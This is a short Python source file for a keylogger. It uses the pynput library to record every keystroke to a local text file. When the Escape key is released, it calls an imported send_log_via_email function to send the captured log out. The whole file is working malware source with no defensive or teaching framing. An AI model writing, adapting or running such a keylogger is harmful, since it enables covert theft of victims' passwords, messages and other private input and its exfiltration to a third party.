# keylogger.py
from pynput.keyboard import Key, Listener
import time
import os
from remote_logger import send_log_via_email  # Import your logging function

log_file = "key_log.txt"

def on_press(key):
    with open(log_file, "a") as log:
        try:
            log.write(f'{key.char}')
        except AttributeError:
            log.write(f'{key}')

def on_release(key):
    if key == Key.esc:
        send_log_via_email(log_file)  # Send log when ESC is pressed (or any other condition)
        return False

if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
